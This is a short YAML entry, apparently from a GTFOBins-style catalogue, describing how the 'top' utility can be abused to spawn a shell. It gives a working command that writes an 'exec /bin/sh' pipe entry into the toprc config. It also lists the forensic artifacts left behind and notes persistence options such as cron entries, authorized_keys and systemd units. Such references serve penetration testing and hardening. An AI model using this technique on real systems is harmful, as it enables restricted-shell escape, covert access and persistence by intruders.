---
name: top
capabilities:
- exec
- spawn
required_permissions:
  level: user
difficulty: low
opsec:
  noise: medium
  artifacts:
  - ~/.bash_history
  - Process arguments visible in ps and auditd
  notes: ''
persistence_potential: true
examples:
- id: shell
  description: Spawn an interactive shell.
  capabilities:
  - spawn
  - exec
  command: |-
    echo -e 'pipe\tx\texec /bin/sh 1>&0 2>&0' >>~/.config/procps/toprc
    top
    # press return twice
    reset
  notes: The config path might be different.
references:
- https://gtfobins.github.io/gtfobins/top/
tags: []
persistence_notes: Combine with write/exec primitives to drop cron entries, authorized_keys, or systemd units.
---
